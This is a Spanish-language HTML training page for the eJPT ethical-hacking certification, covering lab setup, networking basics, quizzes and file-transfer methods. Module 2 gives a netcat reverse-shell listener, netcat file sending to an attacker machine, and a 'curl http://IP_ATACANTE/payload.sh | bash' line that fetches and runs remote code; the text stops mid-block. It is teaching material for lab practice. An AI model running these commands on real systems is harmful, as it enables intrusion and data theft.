@@ -1,0 +1,2434 @@
+```html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MiniCampus EJPT - Hacking Ético</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #4a6fa5;
+            --secondary: #166088;
+            --accent: #4CAF50;
+            --light: #f8f9fa;
+            --dark: #343a40;
+            --warning: #ffc107;
+            --danger: #dc3545;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 1rem 2rem;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo i {
+            color: var(--accent);
+        }
+        
+        nav {
+            background-color: white;
+            width: 250px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            box-shadow: 2px 0 10px rgba(0,0,0,0.1);
+            z-index: 100;
+            transition: transform 0.3s ease;
+        }
+        
+        .nav-header {
+            padding: 1.5rem 1rem;
+            background-color: var(--primary);
+            color: white;
+            font-weight: bold;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .nav-menu {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .nav-item {
+            padding: 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .nav-link {
+            display: block;
+            padding: 1rem;
+            color: var(--dark);
+            text-decoration: none;
+            transition: all 0.3s;
+            position: relative;
+        }
+        
+        .nav-link:hover {
+            background-color: #f0f2f5;
+            color: var(--primary);
+            padding-left: 1.3rem;
+        }
+        
+        .nav-link.active {
+            background-color: var(--primary);
+            color: white;
+            font-weight: 600;
+        }
+        
+        .nav-link i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+        }
+        
+        .content {
+            margin-left: 250px;
+            min-height: 100vh;
+            padding: 2rem;
+        }
+        
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .page-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid #eee;
+        }
+        
+        .page-title {
+            color: var(--primary);
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        
+        .badge {
+            background-color: var(--accent);
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+        
+        .section {
+            margin-bottom: 2rem;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            padding: 2rem;
+        }
+        
+        h2 {
+            color: var(--secondary);
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #eee;
+        }
+        
+        h3 {
+            color: var(--primary);
+            margin: 1.5rem 0 1rem;
+        }
+        
+        p {
+            margin-bottom: 1rem;
+        }
+        
+        ul, ol {
+            margin-bottom: 1rem;
+            padding-left: 2rem;
+        }
+        
+        li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .card {
+            background-color: #f8f9fa;
+            border-left: 4px solid var(--primary);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 5px 5px 0;
+        }
+        
+        .code-block {
+            background-color: #2d3748;
+            color: #e2e8f0;
+            padding: 1.2rem;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 1rem 0;
+            line-height: 1.5;
+        }
+        
+        .command {
+            color: #68d391;
+            font-weight: bold;
+        }
+        
+        .parameter {
+            color: #f6ad55;
+        }
+        
+        .comment {
+            color: #a0aec0;
+            font-style: italic;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            border-radius: 8px;
+            border: 1px solid #eee;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+        
+        th {
+            background-color: var(--primary);
+            color: white;
+            font-weight: 600;
+        }
+        
+        tr:nth-child(even) {
+            background-color: #f8f9fa;
+        }
+        
+        .quiz {
+            background-color: #f0f7ff;
+            border: 1px solid #bee3f8;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .quiz-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #bee3f8;
+        }
+        
+        .question {
+            margin-bottom: 1.5rem;
+        }
+        
+        .options {
+            list-style: none;
+            margin: 1rem 0;
+        }
+        
+        .option {
+            padding: 0.8rem 1rem;
+            background-color: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            margin-bottom: 0.5rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .option:hover {
+            background-color: #ebf8ff;
+            border-color: var(--primary);
+        }
+        
+        .option.selected {
+            background-color: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+        
+        .option.correct {
+            background-color: var(--accent);
+            color: white;
+            border-color: var(--accent);
+        }
+        
+        .option.incorrect {
+            background-color: var(--danger);
+            color: white;
+            border-color: var(--danger);
+        }
+        
+        .feedback {
+            padding: 1rem;
+            margin-top: 1rem;
+            border-radius: 6px;
+            display: none;
+        }
+        
+        .feedback.correct {
+            background-color: #c6f6d5;
+            color: #2f855a;
+            border: 1px solid #9ae6b4;
+        }
+        
+        .feedback.incorrect {
+            background-color: #fed7d7;
+            color: #c53030;
+            border: 1px solid #feb2b2;
+        }
+        
+        .btn {
+            padding: 0.6rem 1.2rem;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            margin-right: 0.5rem;
+        }
+        
+        .btn-primary {
+            background-color: var(--primary);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--secondary);
+            transform: translateY(-2px);
+        }
+        
+        .btn-success {
+            background-color: var(--accent);
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background-color: #38a840;
+        }
+        
+        .btn-warning {
+            background-color: var(--warning);
+            color: #333;
+        }
+        
+        .btn-danger {
+            background-color: var(--danger);
+            color: white;
+        }
+        
+        .progress-container {
+            background-color: #e9ecef;
+            border-radius: 10px;
+            height: 20px;
+            margin: 1rem 0 2rem;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            width: 0%;
+            transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+        
+        .achievements {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+        
+        .achievement {
+            background-color: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 1.5rem;
+            width: 200px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .achievement:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
+        
+        .achievement.locked {
+            opacity: 0.5;
+            filter: grayscale(1);
+        }
+        
+        .achievement.unlocked {
+            border-color: var(--accent);
+            background-color: #f0fff4;
+        }
+        
+        .achievement-icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+        }
+        
+        .achievement.unlocked .achievement-icon {
+            color: var(--accent);
+        }
+        
+        .achievement-title {
+            font-weight: 600;
+            margin-bottom: 0.3rem;
+        }
+        
+        .achievement-desc {
+            font-size: 0.8rem;
+            color: #666;
+        }
+        
+        .game-container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+        
+        .matching-game {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        
+        .term, .definition {
+            padding: 1rem;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            min-height: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .term:hover, .definition:hover {
+            background-color: #ebf8ff;
+            border-color: var(--primary);
+        }
+        
+        .matched {
+            background-color: #c6f6d5;
+            border-color: var(--accent);
+            color: #2f855a;
+        }
+        
+        .glossary {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+        
+        .glossary-term {
+            color: var(--primary);
+            cursor: pointer;
+            border-bottom: 1px dashed var(--primary);
+            transition: all 0.3s;
+            padding: 0.2rem 0;
+            display: block;
+        }
+        
+        .glossary-term:hover {
+            background-color: #ebf8ff;
+            border-bottom: 1px solid var(--primary);
+        }
+        
+        .timeline {
+            position: relative;
+            padding: 2rem 0;
+            margin: 2rem 0;
+        }
+        
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 20px;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background-color: var(--primary);
+        }
+        
+        .timeline-item {
+            position: relative;
+            margin-bottom: 2rem;
+            padding-left: 40px;
+        }
+        
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: 12px;
+            top: 0;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background-color: var(--accent);
+            border: 3px solid white;
+            box-shadow: 0 0 0 2px var(--primary);
+        }
+        
+        .timeline-year {
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 0.3rem;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        footer {
+            background-color: var(--dark);
+            color: white;
+            text-align: center;
+            padding: 2rem;
+            margin-top: 2rem;
+        }
+        
+        .score-display {
+            font-weight: bold;
+            color: var(--accent);
+        }
+        
+        @media (max-width: 768px) {
+            nav {
+                position: fixed;
+                top: 0;
+                left: -250px;
+                height: 100vh;
+                z-index: 1000;
+            }
+            
+            nav.open {
+                transform: translateX(250px);
+            }
+            
+            .content {
+                margin-left: 0;
+                padding: 1rem;
+            }
+            
+            .header-content {
+                justify-content: space-between;
+            }
+            
+            .menu-toggle {
+                display: block;
+            }
+        }
+        
+        .menu-toggle {
+            display: none;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        
+        .drag-area {
+            border: 2px dashed #e2e8f0;
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+            margin: 1rem 0;
+            background-color: #f8fafc;
+        }
+        
+        .drop-zone {
+            min-height: 100px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            margin: 1rem 0;
+            padding: 1rem;
+            background-color: #f8fafc;
+        }
+        
+        .timer {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--danger);
+            margin: 1rem 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                MiniCampus EJPT
+            </div>
+            <button class="menu-toggle" id="menuToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+        </div>
+    </header>
+
+    <nav id="sidebar">
+        <div class="nav-header">
+            <i class="fas fa-graduation-cap"></i> Módulos
+        </div>
+        <ul class="nav-menu">
+            <li class="nav-item">
+                <a href="#introduccion" class="nav-link active">
+                    <i class="fas fa-home"></i> Introducción y Preparación
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="#transferencia" class="nav-link">
+                    <i class="fas fa-exchange-alt"></i> Transferencia de Archivos
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="#explotacion" class="nav-link">
+                    <i class="fas fa-bug"></i> Explotación y Fuerza Bruta
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="#juegos" class="nav-link">
+                    <i class="fas fa-gamepad"></i> Juegos y Progreso
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="#glosario" class="nav-link">
+                    <i class="fas fa-book"></i> Glosario
+                </a>
+            </li>
+        </ul>
+    </nav>
+
+    <div class="content">
+        <!-- Página 1: Introducción y Preparación de Laboratorios -->
+        <div id="introduccion" class="page active">
+            <div class="page-header">
+                <h1 class="page-title">Módulo 1: Introducción y Preparación de Laboratorios</h1>
+                <span class="badge">Básico</span>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-info-circle"></i> Resumen del Módulo</h2>
+                <p>Este módulo cubre los fundamentos esenciales para comenzar en el mundo del hacking ético. Aprenderás sobre conceptos básicos de redes, cómo preparar tu laboratorio de pruebas y las diferencias entre los diferentes tipos de configuraciones de red virtual. Estos conocimientos son la base para todas las actividades de pentesting.</p>
+                
+                <div class="card">
+                    <p><strong>Objetivos de aprendizaje:</strong> Al finalizar este módulo, podrás:</p>
+                    <ul>
+                        <li>Entender los conceptos fundamentales de redes y direcciones IP</li>
+                        <li>Instalar y configurar un laboratorio de pruebas con máquinas virtuales</li>
+                        <li>Diferenciar entre los modos de red NAT, Adaptador Puente y Red Interna</li>
+                        <li>Identificar hosts en una red local</li>
+                        <li>Comprender la importancia de la preparación del entorno de pruebas</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-microchip"></i> Conceptos Fundamentales de Redes</h2>
+                
+                <h3>¿Qué es un host en una red?</h3>
+                <p>Un host es cualquier dispositivo que tiene una dirección IP y está conectado a una red. Puede ser un ordenador, servidor, impresora, teléfono móvil, o cualquier dispositivo que pueda comunicarse a través de la red.</p>
+                
+                <h3>Asignación de IPs y DHCP</h3>
+                <p>El router es el dispositivo encargado de asignar direcciones IP a los diferentes dispositivos de la red local mediante el protocolo DHCP (Dynamic Host Configuration Protocol).</p>
+                <p>Las IPs asignadas son generalmente direcciones IP privadas (como 192.168.x.x) y pueden cambiar si se reinicia el router, aunque algunos dispositivos pueden tener IPs fijas configuradas manualmente.</p>
+                
+                <h3>Máscara de Red y Porciones</h3>
+                <p>La máscara de red (como 255.255.255.0) indica qué parte de la dirección IP corresponde a la red y qué parte corresponde al host.</p>
+                <p>Por ejemplo, en la IP 192.168.1.21 con máscara 255.255.255.0:</p>
+                <ul>
+                    <li><strong>Porción de red:</strong> 192.168.1</li>
+                    <li><strong>Porción de host:</strong> 21</li>
+                </ul>
+                <p>El broadcast es una dirección especial utilizada para enviar mensajes a todos los dispositivos en una red (por ejemplo, 192.168.1.255).</p>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-cogs"></i> Preparación del Laboratorio de Pruebas</h2>
+                
+                <h3>Cómo Instalar el Laboratorio de Pruebas</h3>
+                <p>Para comenzar con el hacking ético, necesitas un entorno de pruebas seguro donde puedas practicar tus habilidades sin violar ninguna ley. Aquí te mostramos cómo configurar tu laboratorio:</p>
+                
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Máquina</th>
+                                <th>Usuario</th>
+                                <th>Contraseña</th>
+                                <th>Notas</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Máquina Atacante (Kali)</strong></td>
+                                <td>kali</td>
+                                <td>kali</td>
+                                <td>Sistema operativo diseñado para pruebas de penetración</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Máquina Windows</strong></td>
+                                <td>-</td>
+                                <td>123123</td>
+                                <td>Clave de acceso para la máquina Windows de pruebas</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Requisitos del laboratorio:</strong></p>
+                    <ul>
+                        <li>VirtualBox o VMware para crear máquinas virtuales</li>
+                        <li>Máquina virtual con Kali Linux (máquina atacante)</li>
+                        <li>Máquinas virtuales con diferentes sistemas operativos para probar (víctimas)</li>
+                        <li>Conexión a Internet para descargar herramientas y actualizaciones</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-sitemap"></i> Diferencias entre NAT, Adaptador Puente y Red Interna</h2>
+                
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Tipo de Red</th>
+                                <th>Características</th>
+                                <th>Conectividad a Internet</th>
+                                <th>Seguridad</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Adaptador Puente</strong></td>
+                                <td>Las máquinas virtuales se comportan como cualquier otro equipo en la red, tienen visibilidad y obtienen una dirección IP similar a los demás dispositivos</td>
+                                <td>Sí</td>
+                                <td>Baja - visible en la red</td>
+                            </tr>
+                            <tr>
+                                <td><strong>NAT (Network Address Translation)</strong></td>
+                                <td>Las máquinas virtuales comparten la IP del anfitrión. Cuando se hace una petición, el servidor ve la IP del anfitrión, no la de la máquina virtual</td>
+                                <td>Sí</td>
+                                <td>Alta - capa adicional de seguridad</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Red Interna/NAT</strong></td>
+                                <td>Interfaz de red que funciona solo en VirtualBox, aislada del resto de la red</td>
+                                <td>No</td>
+                                <td>Muy alta - completamente aislada</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Detalles importantes:</strong></p>
+                    <ul>
+                        <li><strong>Adaptador Puente:</strong> Las máquinas virtuales se comportan como cualquier otro equipo en la red, tienen visibilidad y obtienen una dirección IP similar a los demás dispositivos</li>
+                        <li><strong>NAT:</strong> Cuando hacemos una petición a un servidor desde una máquina virtual con NAT activado, el servidor ve la IP de nuestra máquina anfitriona y no la de la máquina virtual. Esto proporciona una capa adicional de seguridad</li>
+                        <li><strong>Red Interna/NAT:</strong> Se puede crear una interfaz de red que funcione solo en VirtualBox, sin acceso a Internet, ideal para entornos completamente aislados</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-question-circle"></i> Test de Autoevaluación</h2>
+                
+                <div class="quiz">
+                    <div class="quiz-header">
+                        <h3>Test del Módulo 1</h3>
+                        <span>Preguntas: <span id="q1-count">0</span>/5</span>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>1. ¿Qué dispositivo es el encargado de asignar las IPs a los dispositivos en una red local?</strong></p>
+                        <ul class="options">
+                            <li class="option" data-correct="true">Router</li>
+                            <li class="option">Switch</li>
+                            <li class="option">Hub</li>
+                            <li class="option">Módem</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El router es el dispositivo que asigna direcciones IP mediante DHCP.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El router es el dispositivo que asigna direcciones IP mediante DHCP.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>2. ¿Cuál es la clave de acceso para la máquina Windows de pruebas?</strong></p>
+                        <ul class="options">
+                            <li class="option">123456</li>
+                            <li class="option" data-correct="true">123123</li>
+                            <li class="option">password</li>
+                            <li class="option">admin</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! La clave de acceso para la máquina Windows es 123123.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. La clave de acceso para la máquina Windows es 123123.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>3. ¿Qué significa NAT en el contexto de redes virtuales?</strong></p>
+                        <ul class="options">
+                            <li class="option">Network Access Terminal</li>
+                            <li class="option" data-correct="true">Network Address Translation</li>
+                            <li class="option">New Address Technology</li>
+                            <li class="option">Network Allocation Table</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! NAT significa Network Address Translation, que permite que múltiples dispositivos compartan una única dirección IP pública.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. NAT significa Network Address Translation, que permite que múltiples dispositivos compartan una única dirección IP pública.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>4. ¿Qué tipo de red virtual no ofrece acceso a Internet?</strong></p>
+                        <ul class="options">
+                            <li class="option">NAT</li>
+                            <li class="option">Adaptador Puente</li>
+                            <li class="option" data-correct="true">Red Interna/NAT</li>
+                            <li class="option">Todas ofrecen acceso a Internet</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! La Red Interna/NAT es una interfaz de red que funciona solo en VirtualBox y no ofrece acceso a Internet.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. La Red Interna/NAT es una interfaz de red que funciona solo en VirtualBox y no ofrece acceso a Internet.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>5. ¿Qué usuario y contraseña se utilizan para la máquina atacante Kali?</strong></p>
+                        <ul class="options">
+                            <li class="option">admin/admin</li>
+                            <li class="option">root/toor</li>
+                            <li class="option" data-correct="true">kali/kali</li>
+                            <li class="option">user/password</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! Las credenciales para la máquina atacante Kali son usuario: kali y contraseña: kali.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. Las credenciales para la máquina atacante Kali son usuario: kali y contraseña: kali.
+                        </div>
+                    </div>
+                    
+                    <div style="text-align: right; margin-top: 1rem;">
+                        <button class="btn btn-success" id="submit-q1">Enviar respuestas</button>
+                        <button class="btn btn-warning" id="reset-q1">Reiniciar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Página 2: Transferencia de Archivos y Conceptos Básicos de Hacking -->
+        <div id="transferencia" class="page">
+            <div class="page-header">
+                <h1 class="page-title">Módulo 2: Transferencia de Archivos y Conceptos Básicos de Hacking</h1>
+                <span class="badge">Intermedio</span>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-info-circle"></i> Resumen del Módulo</h2>
+                <p>Este módulo explora diferentes métodos para transferir archivos entre máquinas en una red local, una habilidad esencial para cualquier pentester. También cubre los conceptos básicos de hacking, incluyendo el uso de herramientas como netcat para establecer conexiones remotas. Aprenderás sobre los protocolos más comunes, sus ventajas, desventajas y casos de uso práctico en entornos de pruebas de penetración.</p>
+                
+                <div class="card">
+                    <p><strong>Objetivos de aprendizaje:</strong> Al finalizar este módulo, podrás:</p>
+                    <ul>
+                        <li>Implementar diferentes métodos de transferencia de archivos</li>
+                        <li>Evaluar la seguridad de cada método</li>
+                        <li>Seleccionar el método adecuado según el contexto</li>
+                        <li>Aplicar estos métodos en escenarios de pentesting</li>
+                        <li>Entender y aplicar conceptos básicos de hacking ético</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-server"></i> Métodos para Transferir Archivos</h2>
+                
+                <h3>Método 1: Servidor HTTP con Python</h3>
+                <p>El método más sencillo para compartir archivos en una red local es utilizando el módulo http.server de Python.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># En la máquina que envía (atacante):</span><br>
+                    <span class="command">python3 -m http.server 80</span><br><br>
+                    <span class="comment"># En la máquina que recibe (víctima):</span><br>
+                    <span class="comment"># Con wget</span><br>
+                    <span class="command">wget http://IP_ATACANTE/archivo.txt</span><br><br>
+                    <span class="comment"># Con curl</span><br>
+                    <span class="command">curl http://IP_ATACANTE/archivo.txt -o archivo_descargado.txt</span><br><br>
+                    <span class="comment"># Para Windows</span><br>
+                    <span class="command">certutil -urlcache -f http://IP_ATACANTE/archivo.txt archivo_descargado.txt</span>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Ventajas:</strong> Simple, no requiere instalación de software adicional, accesible desde cualquier navegador.</p>
+                    <p><strong>Desventajas:</strong> Requiere Python 3 instalado, tráfico no cifrado (HTTP), necesidad de conocer la IP del atacante.</p>
+                </div>
+                
+                <h3>Método 2: SSH (Secure Shell)</h3>
+                <p>SCP (Secure Copy) es un método seguro y cifrado para transferir archivos entre máquinas que tienen SSH habilitado.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Desde la máquina atacante a la víctima:</span><br>
+                    <span class="command">scp /home/kali/Escritorio/cosa.txt Juan@192.168.1.24:/home/Juan/Desktop/</span><br><br>
+                    <span class="comment"># Desde la máquina víctima a la atacante:</span><br>
+                    <span class="command">scp Juan@192.168.1.24:/home/Juan/Desktop/cosa.txt /home/kali/Escritorio/</span>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Ventajas:</strong> Seguro y cifrado, autenticación robusta, ampliamente disponible.</p>
+                    <p><strong>Desventajas:</strong> Requiere SSH habilitado en ambas máquinas, puede estar bloqueado por firewalls.</p>
+                </div>
+                
+                <h3>Método 3: FTP (File Transfer Protocol)</h3>
+                <p>FTP permite transferir archivos entre máquinas, aunque con importantes consideraciones de seguridad.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># En la máquina atacante (Kali):</span><br>
+                    <span class="command">python3 -m pyftpdlib -p 21 -w -u "kali" -P "kali"</span><br><br>
+                    <span class="parameter">-m pyftpdlib</span> → Ejecuta el módulo pyftpdlib (servidor FTP en Python)<br>
+                    <span class="parameter">-p 21</span> → Puerto 21 (FTP)<br>
+                    <span class="parameter">-w</span> → Permite escritura (uploads/put)<br>
+                    <span class="parameter">-u "kali"</span> → Define usuario<br>
+                    <span class="parameter">-P "kali"</span> → Define contraseña
+                </div>
+                
+                <div class="code-block">
+                    <span class="comment"># En la máquina víctima (Deepin):</span><br>
+                    <span class="command">ftp 192.168.1.26</span><br>
+                    <span class="comment"># Usuario: kali</span><br>
+                    <span class="comment"># Contraseña: kali</span><br><br>
+                    <span class="comment"># Comandos dentro de FTP:</span><br>
+                    <span class="command">ftp> ls</span> → Listar archivos<br>
+                    <span class="command">ftp> get archivo</span> → Descargar archivo<br>
+                    <span class="command">ftp> put archivo</span> → Subir archivo<br>
+                    <span class="command">ftp> bye</span> → Salir
+                </div>
+                
+                <div class="card" style="border-color: var(--danger);">
+                    <p><strong>Aspectos de seguridad CRÍTICOS:</strong></p>
+                    <ul>
+                        <li><strong>Traffico NO cifrado:</strong> FTP envía todo (usuarios, contraseñas, archivos) en texto claro. Cualquier sniffer en la red puede capturar los datos.</li>
+                        <li><strong>Detección fácil:</strong> Los servidores FTP son ruidosos y fácilmente detectados por herramientas de monitoreo.</li>
+                        <li><strong>Uso solo en redes internas/controladas:</strong> Nunca uses FTP en internet abierto.</li>
+                    </ul>
+                </div>
+                
+                <h3>Método 4: Netcat</h3>
+                <p>Netcat es una herramienta versátil que puede usarse para transferir archivos entre máquinas.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># En la máquina atacante (recibiendo):</span><br>
+                    <span class="command">nc -n -l -v -p 4444 > archivo_recibido.txt</span><br><br>
+                    <span class="comment"># En la máquina víctima (enviando):</span><br>
+                    <span class="command">nc -N 192.168.1.26 4444 < archivo_a_enviar.txt</span>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Detalles importantes:</strong></p>
+                    <ul>
+                        <li><strong>Orden CRUCIAL:</strong> Primero inicia netcat en Kali (receptor) y luego en Deepin (emisor).</li>
+                        <li><strong>Sin cifrado:</strong> Todo se envía en texto claro (igual que FTP).</li>
+                        <li><strong>Transferencia única:</strong> La conexión se cierra después de enviar el archivo.</li>
+                        <li><strong>Versiónes de netcat:</strong> La opción -N no está en todas las versiones. Si falla, usa: <code>nc 192.168.1.26 4444 < archivo_a_enviar.txt</code></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-bolt"></i> Conceptos Básicos de Hacking</h2>
+                
+                <h3>Lección 1: Uso de Netcat para entablar Reverse Shell</h3>
+                <p>Netcat es una potente herramienta que permite establecer conexiones remotas. Si podemos ejecutar comandos en la máquina víctima, podemos usar netcat para obtener una reverse shell.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># En la máquina atacante (Kali):</span><br>
+                    <span class="command">nc -n -l -v -p 443</span><br><br>
+                    <span class="parameter">-n</span> → No realiza búsquedas DNS, hace que la conexión sea más rápida<br>
+                    <span class="parameter">-l</span> → Listen, activa el modo escucha, esperando una conexión entrante<br>
+                    <span class="parameter">-v</span> → Verbose, muestra información más detallada sobre lo que está haciendo<br>
+                    <span class="parameter">-p</span> → Especifica el puerto que estará abierto para la conexión entrante
+                </div>
+                
+                <p>En la página <a href="https://www.revshells.com/" target="_blank">https://www.revshells.com/</a>, ingresando la IP y un puerto, obtenemos un comando que si lo ejecutamos desde la máquina víctima, recibiremos una conexión.</p>
+                
+                <h3>Lección 2: Cómo Compartir Archivos Con Servidor Http</h3>
+                <p>Compartir archivos es sencillo con Python:</p>
+                
+                <div class="code-block">
+                    <span class="command">python3 -m http.server 80</span>
+                </div>
+                
+                <p>Con este comando desde la máquina atacante, se pone a la escucha. Después de esto, si en el navegador de la otra máquina pongo la IP de la máquina atacante, accedo y puedo descargar archivos.</p>
+                
+                <p>Si tenemos ejecución remota de comandos desde la máquina víctima, podemos ejecutar un curl o wget:</p>
+                
+                <div class="code-block">
+                    <span class="comment"># En la máquina víctima:</span><br>
+                    <span class="command">curl http://IP_ATACANTE/payload.sh | bash</span><br>
